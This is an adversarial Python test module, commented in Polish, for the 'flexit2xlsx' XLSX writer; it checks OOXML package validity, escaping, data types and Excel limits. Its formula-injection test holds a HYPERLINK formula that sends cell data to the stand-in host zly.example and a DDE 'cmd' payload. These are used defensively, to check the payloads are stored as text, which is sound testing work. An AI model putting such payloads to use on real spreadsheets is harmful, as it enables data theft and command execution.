# -*- coding: utf-8 -*-
"""Testy ADWERSARYJNE poprawności pliku .xlsx produkowanego przez ``flexit2xlsx``.

Celem tego modułu jest ZŁAMANIE zapisu XLSX, a nie potwierdzenie, że działa.
Weryfikacja idzie trzema niezależnymi drogami:

1. **rozpakowanie ZIP-a i parsowanie każdej części przez ``lxml``** — parser
   całkowicie niezależny od ``openpyxl`` i od kodu produkcyjnego,
2. **własny walidator pakietu OOXML** (:func:`sprawdz_pakiet`) — obecność
   ``[Content_Types].xml``, rozwiązywalność relacji, kolejność elementów
   w ``CT_Worksheet``, zgodność referencji komórek z nagłówkiem, brak elementu
   ``<f>`` (formuła), brak typu ``t="s"`` bez ``sharedStrings.xml``,
3. **odczyt przez ``openpyxl``** — wartości, typy komórek i formaty liczbowe.

Każdy test formatu jest uruchamiany DWA RAZY: dla ``FLEXIT_XLSX_BACKEND=stdlib``
i dla ``FLEXIT_XLSX_BACKEND=openpyxl``.

Wszystkie asercje opisują zachowanie WYMAGANE.  (Historycznie moduł zawierał
testy ``test_USTERKA_*`` utrwalające znalezione wady — po ich naprawieniu każdy
z nich został przepisany na asercję stanu poprawnego.)

Uruchamianie::

    python3 -m unittest discover -s tests/adversarial -t .
    python3 tests/adversarial/test_poprawnosc_xlsx.py
"""

import datetime as dt
import os
import re
import subprocess
import sys
import tempfile
import unittest
import zipfile
from contextlib import redirect_stderr
from io import StringIO
from unittest import mock

_KORZEN = os.path.dirname(os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
if _KORZEN not in sys.path:
    sys.path.insert(0, _KORZEN)

import openpyxl  # noqa: E402  (dozwolone w testach — służy tylko do weryfikacji)
from lxml import etree  # noqa: E402  (niezależny parser XML)

from flexit2xlsx import xlsxwrite  # noqa: E402
from flexit2xlsx.xlsxwrite import Sheet, safe_sheet_name, write_workbook  # noqa: E402


# --------------------------------------------------------------------------- #
# Niezależny walidator pakietu OOXML (tylko lxml + zipfile)
# --------------------------------------------------------------------------- #

NS = "http://schemas.openxmlformats.org/spreadsheetml/2006/main"
NSR = "http://schemas.openxmlformats.org/officeDocument/2006/relationships"
NSPR = "http://schemas.openxmlformats.org/package/2006/relationships"
NSCT = "http://schemas.openxmlformats.org/package/2006/content-types"

#: Kolejność elementów potomnych ``CT_Worksheet`` wg ECMA-376 (sekwencja, nie wybór).
KOLEJNOSC_WORKSHEET = [
    "sheetPr", "dimension", "sheetViews", "sheetFormatPr", "cols", "sheetData",
    "sheetCalcPr", "sheetProtection", "protectedRanges", "scenarios", "autoFilter",
    "sortState", "dataConsolidate", "customSheetViews", "mergeCells", "phoneticPr",
    "conditionalFormatting", "dataValidations", "hyperlinks", "printOptions",
    "pageMargins", "pageSetup", "headerFooter", "rowBreaks", "colBreaks",
    "customProperties", "cellWatches", "ignoredErrors", "smartTags", "drawing",
    "legacyDrawing", "legacyDrawingHF", "picture", "oleObjects", "controls",
    "webPublishItems", "tableParts", "extLst",
]


def _rozbij_ref(ref):
    """Zamienia ``"AB12"`` na ``(28, 12)`` — numer kolumny i numer wiersza."""
    dopasowanie = re.match(r"^([A-Z]+)([0-9]+)$", ref or "")
    if not dopasowanie:
        return None, None
    numer = 0
    for znak in dopasowanie.group(1):
        numer = numer * 26 + (ord(znak) - 64)
    return numer, int(dopasowanie.group(2))


def sprawdz_pakiet(sciezka):
    """Waliduje plik XLSX bez użycia ``openpyxl``.  Zwraca listę usterek (pusta = OK)."""
    bledy = []
    archiwum = zipfile.ZipFile(sciezka)
    nazwy = set(archiwum.namelist())

    uszkodzony = archiwum.testzip()
    if uszkodzony:
        bledy.append("uszkodzony wpis ZIP: %s" % uszkodzony)
    for wymagana in ("[Content_Types].xml", "_rels/.rels", "xl/workbook.xml",
                     "xl/_rels/workbook.xml.rels"):
        if wymagana not in nazwy:
            bledy.append("brak części %s" % wymagana)

    drzewa = {}
    for nazwa in sorted(nazwy):
        if nazwa.endswith(".xml") or nazwa.endswith(".rels"):
            try:
                drzewa[nazwa] = etree.fromstring(archiwum.read(nazwa))
            except Exception as blad:  # noqa: BLE001 - dowolny błąd parsera to usterka
                bledy.append("XML niepoprawny w %s: %s" % (nazwa, blad))
    if bledy:
        return bledy

    # --- typy zawartości ---------------------------------------------------- #
    typy = drzewa["[Content_Types].xml"]
    domyslne = {el.get("Extension").lower() for el in typy.findall("{%s}Default" % NSCT)}
    nadpisania = {el.get("PartName") for el in typy.findall("{%s}Override" % NSCT)}
    for nazwa in sorted(nazwy):
        if "/" + nazwa in nadpisania:
            continue
        rozszerzenie = nazwa.rsplit(".", 1)[-1].lower() if "." in nazwa else ""
        if rozszerzenie not in domyslne:
            bledy.append("część %s nie ma zadeklarowanego typu zawartości" % nazwa)
    for part_name in nadpisania:
        if part_name.lstrip("/") not in nazwy:
            bledy.append("Override wskazuje na nieistniejącą część %s" % part_name)

    # --- relacje ------------------------------------------------------------ #
    def rozwiaz(cel, baza):
        if cel.startswith("/"):
            return cel[1:]
        return (baza + cel).replace("//", "/")

    for plik_rels, baza in (("_rels/.rels", ""), ("xl/_rels/workbook.xml.rels", "xl/")):
        for rel in drzewa[plik_rels].findall("{%s}Relationship" % NSPR):
            if rel.get("TargetMode") == "External":
                continue
            pelna = rozwiaz(rel.get("Target"), baza)
            if pelna not in nazwy:
                bledy.append("relacja %s -> %s nie istnieje w pakiecie"
                             % (rel.get("Id"), pelna))

    # --- workbook -> arkusze ------------------------------------------------ #
    mapa_rel = {rel.get("Id"): rel.get("Target")
                for rel in drzewa["xl/_rels/workbook.xml.rels"].findall("{%s}Relationship" % NSPR)}
    arkusze = []
    widziane_nazwy, widziane_id = set(), set()
    for wpis in drzewa["xl/workbook.xml"].find("{%s}sheets" % NS):
        rid = wpis.get("{%s}id" % NSR)
        nazwa = wpis.get("name")
        if rid not in mapa_rel:
            bledy.append("arkusz %r ma r:id=%s bez relacji" % (nazwa, rid))
        else:
            arkusze.append((nazwa, rozwiaz(mapa_rel[rid], "xl/")))
        if not nazwa or len(nazwa) > 31:
            bledy.append("niedozwolona nazwa arkusza %r" % nazwa)
        elif nazwa.startswith("'") or nazwa.endswith("'"):
            bledy.append("nazwa arkusza %r zaczyna się/kończy apostrofem" % nazwa)
        elif any(znak in nazwa for znak in "[]:*?/\\"):
            bledy.append("nazwa arkusza %r zawiera znak zabroniony przez Excela" % nazwa)
        if nazwa and nazwa.lower() in widziane_nazwy:
            bledy.append("zduplikowana nazwa arkusza %r" % nazwa)
        widziane_nazwy.add((nazwa or "").lower())
        if wpis.get("sheetId") in widziane_id:
            bledy.append("zduplikowany sheetId %s" % wpis.get("sheetId"))
        widziane_id.add(wpis.get("sheetId"))

    # --- style -------------------------------------------------------------- #
    liczba_xf = 0
    if "xl/styles.xml" in drzewa:
        style = drzewa["xl/styles.xml"]
        for tag in ("fonts", "fills", "borders", "numFmts", "cellStyleXfs",
                    "cellXfs", "cellStyles"):
            element = style.find("{%s}%s" % (NS, tag))
            if element is None:
                continue
            if tag == "cellXfs":
                liczba_xf = len(element)
            deklarowane = element.get("count")
            if deklarowane is not None and int(deklarowane) != len(element):
                bledy.append("%s: count=%s a elementów %d" % (tag, deklarowane, len(element)))

    # --- arkusze ------------------------------------------------------------ #
    ma_shared_strings = "xl/sharedStrings.xml" in nazwy
    for nazwa_arkusza, czesc in arkusze:
        if czesc not in drzewa:
            bledy.append("arkusz %r: brak części %s" % (nazwa_arkusza, czesc))
            continue
        korzen = drzewa[czesc]
        if etree.QName(korzen).localname != "worksheet":
            bledy.append("%s: korzeń to %s" % (czesc, korzen.tag))
        pozycja = -1
        for dziecko in korzen:
            lokalna = etree.QName(dziecko).localname
            if lokalna not in KOLEJNOSC_WORKSHEET:
                bledy.append("%s: nieznany element %s" % (czesc, lokalna))
                continue
            indeks = KOLEJNOSC_WORKSHEET.index(lokalna)
            if indeks < pozycja:
                bledy.append("%s: element %s w złej kolejności" % (czesc, lokalna))
            pozycja = indeks

        dane = korzen.find("{%s}sheetData" % NS)
        naglowek, max_wiersz, max_kolumna = 0, 0, 0
        if dane is not None:
            poprzedni_wiersz = 0
            for wiersz in dane:
                numer = int(wiersz.get("r"))
                if numer <= poprzedni_wiersz:
                    bledy.append("%s: numer wiersza %d nie rośnie" % (czesc, numer))
                poprzedni_wiersz = numer
                max_wiersz = max(max_wiersz, numer)
                poprzednia_kolumna = 0
                for komorka in wiersz:
                    ref = komorka.get("r")
                    kolumna, w_wierszu = _rozbij_ref(ref)
                    if kolumna is None:
                        bledy.append("%s: zła referencja komórki %r" % (czesc, ref))
                        continue
                    if w_wierszu != numer:
                        bledy.append("%s: komórka %s w wierszu %d" % (czesc, ref, numer))
                    if kolumna <= poprzednia_kolumna:
                        bledy.append("%s: komórki nie rosną: %s" % (czesc, ref))
                    poprzednia_kolumna = kolumna
                    max_kolumna = max(max_kolumna, kolumna)
                    typ = komorka.get("t")
                    if typ is not None and typ not in ("b", "n", "s", "str", "inlineStr", "e", "d"):
                        bledy.append("%s: nieznany typ komórki t=%r" % (czesc, typ))
                    if typ == "s" and not ma_shared_strings:
                        bledy.append("%s: komórka %s ma t='s' bez sharedStrings.xml" % (czesc, ref))
                    if komorka.find("{%s}f" % NS) is not None:
                        bledy.append("%s: komórka %s zawiera FORMUŁĘ <f>" % (czesc, ref))
                    styl = komorka.get("s")
                    if styl is not None and liczba_xf and int(styl) >= liczba_xf:
                        bledy.append("%s: komórka %s ma s=%s poza cellXfs" % (czesc, ref, styl))
                    if typ == "b":
                        wartosc = komorka.find("{%s}v" % NS)
                        if wartosc is None or wartosc.text not in ("0", "1"):
                            bledy.append("%s: komórka logiczna %s ma złą wartość" % (czesc, ref))
                    if typ in (None, "n"):
                        wartosc = komorka.find("{%s}v" % NS)
                        if wartosc is not None:
                            try:
                                float(wartosc.text)
                            except (TypeError, ValueError):
                                bledy.append("%s: komórka liczbowa %s ma v=%r"
                                             % (czesc, ref, wartosc.text))
                if numer == 1:
                    naglowek = len(wiersz)

        filtr = korzen.find("{%s}autoFilter" % NS)
        if filtr is not None:
            zakres = re.match(r"^([A-Z]+[0-9]+):([A-Z]+[0-9]+)$", filtr.get("ref") or "")
            if not zakres:
                bledy.append("%s: zły zakres autoFilter %r" % (czesc, filtr.get("ref")))
            else:
                kol, wie = _rozbij_ref(zakres.group(2))
                if wie != max_wiersz:
                    bledy.append("%s: autoFilter do wiersza %d, dane do %d"
                                 % (czesc, wie, max_wiersz))
                if kol < max_kolumna:
                    bledy.append("%s: autoFilter do kolumny %d, dane do %d"
                                 % (czesc, kol, max_kolumna))
        if naglowek and max_kolumna > naglowek:
            bledy.append("%s: wiersz danych ma %d kolumn, a nagłówek %d"
                         % (czesc, max_kolumna, naglowek))
    return bledy


# --------------------------------------------------------------------------- #
# Wspólna baza testów (obie ścieżki zapisu)
# --------------------------------------------------------------------------- #


class _BazaBackendu(unittest.TestCase):
    """Mieszanka uruchamiająca ten sam zestaw testów dla obu ścieżek zapisu."""

    BACKEND = "stdlib"

    def setUp(self):
        self._poprzedni = os.environ.get(xlsxwrite.ENV_BACKEND)
        os.environ[xlsxwrite.ENV_BACKEND] = self.BACKEND
        self.katalog = tempfile.mkdtemp(prefix="adw-xlsx-")
        self.addCleanup(self._sprzatnij)

    def _sprzatnij(self):
        if self._poprzedni is None:
            os.environ.pop(xlsxwrite.ENV_BACKEND, None)
        else:
            os.environ[xlsxwrite.ENV_BACKEND] = self._poprzedni
        import shutil
        shutil.rmtree(self.katalog, ignore_errors=True)

    def sciezka(self, nazwa="wynik.xlsx"):
        return os.path.join(self.katalog, nazwa)

    def zapisz(self, arkusze, nazwa="wynik.xlsx", **kw):
        cel = self.sciezka(nazwa)
        write_workbook(cel, arkusze, **kw)
        return cel

    def waliduj(self, cel):
        bledy = sprawdz_pakiet(cel)
        self.assertEqual(bledy, [], "pakiet OOXML niepoprawny:\n  " + "\n  ".join(bledy))

    def wartosci(self, cel, arkusz=None):
        skoroszyt = openpyxl.load_workbook(cel)
        strona = skoroszyt[arkusz] if arkusz else skoroszyt.worksheets[0]
        return [[komorka.value for komorka in wiersz] for wiersz in strona.iter_rows()]

    # ---------------------------------------------------------------- #
    # 1. Struktura pakietu
    # ---------------------------------------------------------------- #

    def test_pakiet_ooxml_jest_spojny(self):
        """Bogaty skoroszyt musi przejść pełną walidację pakietu."""
        arkusze = [
            Sheet(name="Wszystkie aukcje", columns=["Aukcja", "Nr", "Cena", "Data"],
                  rows=[["AUK-1", 1, 1234.56, dt.date(2026, 6, 18)],
                        ["AUK-2", 2, None, dt.datetime(2026, 6, 18, 14, 0)]]),
            Sheet(name="Podsumowanie", columns=["Plik", "Pozycje"], rows=[["a.xml", 2]]),
        ]
        cel = self.zapisz(arkusze)
        self.waliduj(cel)
        czesci = set(zipfile.ZipFile(cel).namelist())
        for wymagana in ("[Content_Types].xml", "_rels/.rels", "xl/workbook.xml",
                         "xl/_rels/workbook.xml.rels", "xl/styles.xml",
                         "xl/worksheets/sheet1.xml", "xl/worksheets/sheet2.xml"):
            self.assertIn(wymagana, czesci)

    def test_kazda_czesc_xml_parsuje_sie_niezaleznym_parserem(self):
        """Wszystkie części pakietu muszą być dobrze uformowanym XML-em wg lxml."""
        cel = self.zapisz([Sheet(name="S", columns=["a", "b"], rows=[["x", 1]])])
        archiwum = zipfile.ZipFile(cel)
        sprawdzone = 0
        for nazwa in archiwum.namelist():
            if nazwa.endswith((".xml", ".rels")):
                etree.fromstring(archiwum.read(nazwa))
                sprawdzone += 1
        self.assertGreaterEqual(sprawdzone, 6)

    def test_pusta_lista_arkuszy_daje_poprawny_plik(self):
        """Skoroszyt bez arkuszy jest niepoprawny — musi powstać arkusz zastępczy."""
        cel = self.zapisz([])
        self.waliduj(cel)
        self.assertEqual(len(openpyxl.load_workbook(cel).worksheets), 1)

    def test_wylaczone_formatowanie_nadal_daje_poprawny_pakiet(self):
        cel = self.zapisz([Sheet(name="S", columns=["a", "b"], rows=[["x", 1]])],
                          freeze_header=False, autofilter=False, auto_width=False)
        self.waliduj(cel)
        arkusz = zipfile.ZipFile(cel).read("xl/worksheets/sheet1.xml").decode("utf-8")
        self.assertNotIn("<cols>", arkusz)
        self.assertNotIn("<autoFilter", arkusz)
        self.assertNotIn("<pane ", arkusz)

    # ---------------------------------------------------------------- #
    # 2. Escapowanie i znaki
    # ---------------------------------------------------------------- #

    def test_escapowanie_znakow_specjalnych_xml(self):
        """``< > & " '`` muszą przetrwać zapis i odczyt bez zmiany."""
        teksty = ['R&D <tag>', '"cudzysłów"', "'apostrof'", "]]>", "&amp; nie jest encją",
                  "a<b>c&d\"e'f"]
        cel = self.zapisz([Sheet(name="S", columns=["k%d" % i for i in range(len(teksty))],
                                 rows=[list(teksty)])])
        self.waliduj(cel)
        self.assertEqual(self.wartosci(cel)[1], teksty)
        surowy = zipfile.ZipFile(cel).read("xl/worksheets/sheet1.xml").decode("utf-8")
        self.assertNotIn("<tag>", surowy)  # musiało zostać zescapowane
        self.assertIn("&lt;tag&gt;", surowy)

    def test_polskie_znaki_i_inne_alfabety(self):
        teksty = ["Zażółć gęślą jaźń", "ŁÓDŹ ĄĆĘŃŚŹŻ", "联想 ThinkPad", "sprzęt 🖥️ OK",
                  "‏مرحبا", "Ω" * 20]
        cel = self.zapisz([Sheet(name="Polskie znaki",
                                 columns=["k%d" % i for i in range(len(teksty))],
                                 rows=[list(teksty)])])
        self.waliduj(cel)
        self.assertEqual(self.wartosci(cel)[1], teksty)

    def test_biale_znaki_zachowane(self):
        """Wiodące/końcowe spacje, tabulatory i znaki nowej linii nie mogą zniknąć."""
        teksty = ["  wiodąca", "końcowa  ", "   ", "linia1\nlinia2", "a\tb", "a\rb", "a\r\nb"]
        cel = self.zapisz([Sheet(name="S", columns=["k%d" % i for i in range(len(teksty))],
                                 rows=[list(teksty)])])
        self.waliduj(cel)
        self.assertEqual(self.wartosci(cel)[1], teksty)

    def test_znaki_sterujace_i_surogaty_w_DANYCH_nie_psuja_pliku(self):
        """Wartości komórek muszą być odkażane — plik ma pozostać poprawny."""
        brudne = ["a\x00b", "a\x0bc", "a\x0cd", "a\x1fe", "a\ud800f", "a\udfffg",
                  "a￾h", "a￿i", "a\x7fj"]
        cel = self.zapisz([Sheet(name="S", columns=["k%d" % i for i in range(len(brudne))],
                                 rows=[list(brudne)])])
        self.waliduj(cel)
        odczyt = self.wartosci(cel)[1]
        for wartosc in odczyt:
            self.assertNotIn("\x00", wartosc)
            for znak in wartosc:
                self.assertFalse(0xD800 <= ord(znak) <= 0xDFFF, "surogat przetrwał: %r" % wartosc)
            self.assertNotIn("￾", wartosc)
        self.assertEqual(odczyt[-1], "a\x7fj")  # \x7f jest legalny w XML — musi zostać

    def test_tekst_dluzszy_niz_limit_excela_jest_przycinany(self):
        cel = self.zapisz([Sheet(name="S", columns=["dlugi"], rows=[["ą" * 40000]])])
        self.waliduj(cel)
        self.assertEqual(len(self.wartosci(cel)[1][0]), 32767)

    # ---------------------------------------------------------------- #
    # 3. Wstrzyknięcie formuły
    # ---------------------------------------------------------------- #

    def test_brak_wstrzykniecia_formuly(self):
        """Żaden tekst nie może trafić do pliku jako element ``<f>``."""
        zlosliwe = [
            '=HYPERLINK("http://zly.example/x?d="&A1,"klik")',
            '=cmd|\' /C calc\'!A0',
            "+1+1",
            "-2+3",
            "@SUM(A1:A9)",
            "\t=1+1",
            "\r=1+1",
            "   =1+1",
            "=1+1",
        ]
        cel = self.zapisz([Sheet(name="S", columns=["k%d" % i for i in range(len(zlosliwe))],
                                 rows=[list(zlosliwe)])])
        self.waliduj(cel)
        surowy = zipfile.ZipFile(cel).read("xl/worksheets/sheet1.xml").decode("utf-8")
        self.assertNotIn("<f>", surowy)
        self.assertNotIn("<f ", surowy)
        skoroszyt = openpyxl.load_workbook(cel)
        arkusz = skoroszyt["S"]
        for indeks, oryginal in enumerate(zlosliwe, start=1):
            komorka = arkusz.cell(row=2, column=indeks)
            self.assertEqual(komorka.data_type, "s",
                             "komórka %d nie jest tekstem" % indeks)
            self.assertEqual(komorka.value, oryginal.replace("\r", "\r"))

    def test_naglowek_zaczynajacy_sie_od_rownosci_tez_jest_tekstem(self):
        cel = self.zapisz([Sheet(name="S", columns=["=SUMA(A:A)", "+7"], rows=[["a", "b"]])])
        self.waliduj(cel)
        surowy = zipfile.ZipFile(cel).read("xl/worksheets/sheet1.xml").decode("utf-8")
        self.assertNotIn("<f>", surowy)
        self.assertEqual(self.wartosci(cel)[0], ["=SUMA(A:A)", "+7"])

    # ---------------------------------------------------------------- #
    # 4. Typy i formaty
    # ---------------------------------------------------------------- #

    def test_typy_natywne_i_formaty_dat(self):
        wartosci = [
            dt.date(2026, 6, 18),
            dt.datetime(2026, 6, 18, 14, 5, 30),
            dt.time(14, 30, 15),
            dt.timedelta(hours=30, minutes=5),
            dt.datetime(2026, 6, 18, 14, 0, tzinfo=dt.timezone(dt.timedelta(hours=2))),
            True,
            False,
            12345,
            1234.56,
            float("nan"),
            float("inf"),
        ]
        cel = self.zapisz([Sheet(name="S",
                                 columns=["k%d" % i for i in range(len(wartosci))],
                                 rows=[list(wartosci)])])
        self.waliduj(cel)
        arkusz = openpyxl.load_workbook(cel)["S"]
        odczyt = [arkusz.cell(row=2, column=i + 1) for i in range(len(wartosci))]
        self.assertEqual(odczyt[0].value, dt.datetime(2026, 6, 18))
        self.assertEqual(odczyt[1].value, dt.datetime(2026, 6, 18, 14, 5, 30))
        self.assertEqual(odczyt[2].value, dt.time(14, 30, 15))
        self.assertEqual(odczyt[3].value, dt.timedelta(hours=30, minutes=5))
        # data ze strefą +02:00 musi zostać sprowadzona do UTC
        self.assertEqual(odczyt[4].value, dt.datetime(2026, 6, 18, 12, 0))
        self.assertIs(odczyt[5].value, True)
        self.assertIs(odczyt[6].value, False)
        self.assertEqual(odczyt[5].data_type, "b")
        self.assertEqual(odczyt[7].value, 12345)
        self.assertEqual(odczyt[8].value, 1234.56)
        self.assertEqual(odczyt[9].value, "nan")   # NaN nie jest liczbą w XLSX
        self.assertEqual(odczyt[10].value, "inf")
        for indeks in (0, 1, 2, 3, 4):
            self.assertTrue(re.search(r"[dmyh]", odczyt[indeks].number_format),
                            "komórka %d nie ma formatu daty" % indeks)

    def test_wartosci_puste_nie_tworza_komorek(self):
        cel = self.zapisz([Sheet(name="S", columns=["a", "b", "c"],
                                 rows=[[None, "", "x"]])])
        self.waliduj(cel)
        self.assertEqual(self.wartosci(cel)[1], [None, None, "x"])

    # ---------------------------------------------------------------- #
    # 5. Nagłówek a dane
    # ---------------------------------------------------------------- #

    def test_liczba_kolumn_danych_nigdy_nie_przekracza_naglowka(self):
        cel = self.zapisz([Sheet(name="S", columns=["a", "b"],
                                 rows=[["x"], ["x", "y"], ["x", "y", "NADMIAR"]])])
        self.waliduj(cel)  # walidator sprawdza max_kolumna <= len(nagłówka)
        odczyt = self.wartosci(cel)
        self.assertEqual(odczyt[0], ["a", "b"])
        self.assertNotIn("NADMIAR", [v for w in odczyt for v in w])

    def test_naglowek_jest_pogrubiony_i_zamrozony(self):
        cel = self.zapisz([Sheet(name="S", columns=["a", "b"], rows=[["x", "y"]])])
        arkusz = openpyxl.load_workbook(cel)["S"]
        self.assertTrue(arkusz.cell(row=1, column=1).font.bold)
        self.assertEqual(arkusz.freeze_panes, "A2")
        self.assertEqual(arkusz.auto_filter.ref, "A1:B2")

    # ---------------------------------------------------------------- #
    # 6. Limity Excela
    # ---------------------------------------------------------------- #

    def test_podzial_po_wierszach_bez_utraty_danych(self):
        with mock.patch.object(xlsxwrite, "MAX_ROWS_PER_SHEET", 4), \
             mock.patch.object(xlsxwrite, "WIDTH_SAMPLE_ROWS", 2), \
             redirect_stderr(StringIO()) as strumien:
            cel = self.zapisz([Sheet(name="Dane", columns=["a", "b"],
                                     rows=iter([["r%d" % i, i] for i in range(10)]))])
        self.assertIn("limit", strumien.getvalue())
        self.waliduj(cel)
        skoroszyt = openpyxl.load_workbook(cel)
        self.assertEqual(len(skoroszyt.worksheets), 4)
        zebrane = []
        for arkusz in skoroszyt.worksheets:
            self.assertEqual([k.value for k in arkusz[1]], ["a", "b"])
            zebrane += [w[0].value for w in arkusz.iter_rows(min_row=2)]
        self.assertEqual(zebrane, ["r%d" % i for i in range(10)])

    def test_podzial_po_kolumnach_bez_utraty_danych(self):
        with mock.patch.object(xlsxwrite, "MAX_COLS_PER_SHEET", 2), \
             redirect_stderr(StringIO()):
            cel = self.zapisz([Sheet(name="Dane", columns=["k0", "k1", "k2", "k3", "k4"],
                                     rows=iter([["w%d-%d" % (r, c) for c in range(5)]
                                                for r in range(3)]))])
        self.waliduj(cel)
        skoroszyt = openpyxl.load_workbook(cel)
        self.assertEqual(len(skoroszyt.worksheets), 3)
        zebrane = set()
        for arkusz in skoroszyt.worksheets:
            for wiersz in arkusz.iter_rows(min_row=2, values_only=True):
                zebrane.update(v for v in wiersz if v is not None)
        self.assertEqual(zebrane, {"w%d-%d" % (r, c) for r in range(3) for c in range(5)})

    def test_granice_podzialu_nie_tworza_pustych_arkuszy(self):
        """Liczba wierszy równa limitowi nie może dawać dodatkowego, pustego arkusza."""
        with mock.patch.object(xlsxwrite, "MAX_ROWS_PER_SHEET", 4), \
             redirect_stderr(StringIO()):
            cel = self.zapisz([Sheet(name="D", columns=["a"], rows=[[i] for i in range(3)])])
        self.assertEqual(len(openpyxl.load_workbook(cel).worksheets), 1)

    def test_maksymalna_liczba_kolumn(self):
        kolumny = ["k%d" % i for i in range(xlsxwrite.MAX_COLS_PER_SHEET)]
        with redirect_stderr(StringIO()) as strumien:
            cel = self.zapisz([Sheet(name="W", columns=kolumny,
                                     rows=[list(range(len(kolumny)))])])
        self.assertEqual(strumien.getvalue(), "")  # bez podziału i bez ostrzeżeń
        self.waliduj(cel)
        surowy = zipfile.ZipFile(cel).read("xl/worksheets/sheet1.xml").decode("utf-8")
        self.assertIn('r="XFD1"', surowy)

    # ---------------------------------------------------------------- #
    # 7. Zapis atomowy
    # ---------------------------------------------------------------- #

    def test_blad_w_trakcie_nie_niszczy_istniejacego_pliku(self):
        cel = self.zapisz([Sheet(name="S", columns=["a"], rows=[["stary"]])])
        with open(cel, "rb") as plik:
            przed = plik.read()

        def wybuchowy():
            yield ["ok"]
            raise RuntimeError("awaria w trakcie generowania")

        with self.assertRaises(RuntimeError):
            write_workbook(cel, [Sheet(name="S", columns=["a"], rows=wybuchowy())])
        with open(cel, "rb") as plik:
            self.assertEqual(plik.read(), przed)
        smieci = [n for n in os.listdir(self.katalog) if n.startswith(".flexit2xlsx-")]
        self.assertEqual(smieci, [], "został plik tymczasowy: %s" % smieci)

    # ---------------------------------------------------------------- #
    # 8. USTERKI (asercje opisują stan ZAOBSERWOWANY)
    # ---------------------------------------------------------------- #

    def test_naglowek_przechodzi_przez_sanitize_cell(self):
        """Nazwy kolumn są odkażane tak samo jak wartości.

        Znak ``\\x0b`` (nielegalny w XML-u) musi zniknąć z nagłówka, a plik ma
        pozostać poprawnym pakietem OOXML w OBU ścieżkach zapisu.
        """
        arkusz = Sheet(name="S", columns=["kol\x0bumna", "b"], rows=[["x", "y"]])
        cel = self.zapisz([arkusz])
        self.waliduj(cel)
        dane = zipfile.ZipFile(cel).read("xl/worksheets/sheet1.xml")
        self.assertNotIn(b"\x0b", dane)
        etree.fromstring(dane)                       # musi się sparsować
        self.assertEqual(self.wartosci(cel)[0], ["kolumna", "b"])

    def test_nazwa_arkusza_z_ufffe_jest_oczyszczona(self):
        """``safe_sheet_name`` usuwa znaki nielegalne w XML-u (U+FFFE).

        U+FFFE jest legalny w nazwie pliku, ale ZABRONIONY w XML-u, więc nie
        może trafić do ``xl/workbook.xml``.
        """
        self.assertNotIn("\ufffe", safe_sheet_name("aukcja \ufffe 1", set()))
        arkusz = Sheet(name="aukcja \ufffe 1", columns=["a"], rows=[["x"]])
        cel = self.zapisz([arkusz])
        self.waliduj(cel)
        etree.fromstring(zipfile.ZipFile(cel).read("xl/workbook.xml"))
        skoroszyt = openpyxl.load_workbook(cel)
        try:
            self.assertEqual(len(skoroszyt.sheetnames), 1)
            self.assertNotIn("\ufffe", skoroszyt.sheetnames[0])
        finally:
            skoroszyt.close()

    def test_nazwa_arkusza_z_surogatem_jest_oczyszczona(self):
        """Samotny surogat w nazwie arkusza nie wywala zapisu.

        Samotne surogaty pojawiają się naturalnie: Python dekoduje nazwy plików
        spoza UTF-8 przez ``surrogateescape``.  ``safe_sheet_name`` musi je
        usunąć — tak jak ``sanitize_cell`` robi to dla wartości.
        """
        self.assertNotIn("\udcb3", safe_sheet_name("aukcja \udcb3 1", set()))
        cel = self.zapisz([Sheet(name="aukcja \udcb3 1", columns=["a"], rows=[["x"]])])
        self.waliduj(cel)
        skoroszyt = openpyxl.load_workbook(cel)
        try:
            self.assertNotIn("\udcb3", skoroszyt.sheetnames[0])
        finally:
            skoroszyt.close()

    def test_daty_sprzed_1900_sa_tekstem_iso(self):
        """Daty sprzed 1900-01-01 zapisujemy jako tekst ISO — bez wyjątków.

        Serial 0 w Excelu to godzina 00:00, więc 1899-12-31 nie może dostać
        numeru seryjnego; obie graniczne daty mają być tekstem.
        """
        cel = self.zapisz([Sheet(name="S", columns=["a", "b"],
                                 rows=[[dt.date(1899, 12, 30), dt.date(1899, 12, 31)]])])
        self.waliduj(cel)
        skoroszyt = openpyxl.load_workbook(cel)
        try:
            arkusz = skoroszyt["S"]
            self.assertEqual(arkusz.cell(row=2, column=1).value, "1899-12-30")
            self.assertEqual(arkusz.cell(row=2, column=2).value, "1899-12-31")
        finally:
            skoroszyt.close()

    def test_wiersze_jako_iteratory_przezywaja_auto_width(self):
        """Wiersz podany jako iterator zapisuje się tak samo w obu trybach.

        Próbka do wyliczenia szerokości kolumn nie może skonsumować iteratora.
        """
        wiersze = lambda: [iter(["a1", "b1"]), iter(["a2", "b2"])]  # noqa: E731
        z_szerokoscia = self.zapisz([Sheet(name="S", columns=["A", "B"], rows=wiersze())],
                                    nazwa="z.xlsx")
        bez_szerokosci = self.zapisz([Sheet(name="S", columns=["A", "B"], rows=wiersze())],
                                     nazwa="bez.xlsx", auto_width=False)
        oczekiwane = [["A", "B"], ["a1", "b1"], ["a2", "b2"]]
        self.assertEqual(self.wartosci(z_szerokoscia), oczekiwane)
        self.assertEqual(self.wartosci(bez_szerokosci), oczekiwane)

    def test_plik_wynikowy_respektuje_umask(self):
        """Plik wynikowy ma prawa wynikające z umask użytkownika, nie 0600."""
        poprzednia = os.umask(0o022)
        try:
            cel = self.zapisz([Sheet(name="S", columns=["a"], rows=[["x"]])])
        finally:
            os.umask(poprzednia)
        self.assertEqual(os.stat(cel).st_mode & 0o777, 0o644)


class TestZapisStdlib(_BazaBackendu):
    """Wbudowany generator OOXML (bez zależności zewnętrznych)."""

    BACKEND = "stdlib"

    def test_backend_jest_ten_ktorego_oczekujemy(self):
        self.assertEqual(xlsxwrite.backend_name(), "stdlib")

    def test_wynik_jest_deterministyczny(self):
        import hashlib
        sumy = []
        for indeks in range(2):
            cel = self.zapisz([Sheet(name="S", columns=["a"], rows=[["x"]])],
                              nazwa="d%d.xlsx" % indeks)
            with open(cel, "rb") as plik:
                sumy.append(hashlib.sha256(plik.read()).hexdigest())
        self.assertEqual(sumy[0], sumy[1])


class TestZapisOpenpyxl(_BazaBackendu):
    """Ścieżka przez bibliotekę ``openpyxl`` (tryb write_only)."""

    BACKEND = "openpyxl"

    def test_backend_jest_ten_ktorego_oczekujemy(self):
        self.assertEqual(xlsxwrite.backend_name(), "openpyxl")


# --------------------------------------------------------------------------- #
# Nazwy arkuszy — reguły Excela
# --------------------------------------------------------------------------- #


class TestNazwArkuszy(unittest.TestCase):
    """Kontrakt: ``<=31`` znaków, bez ``[]:*?/\\``, unikalna."""

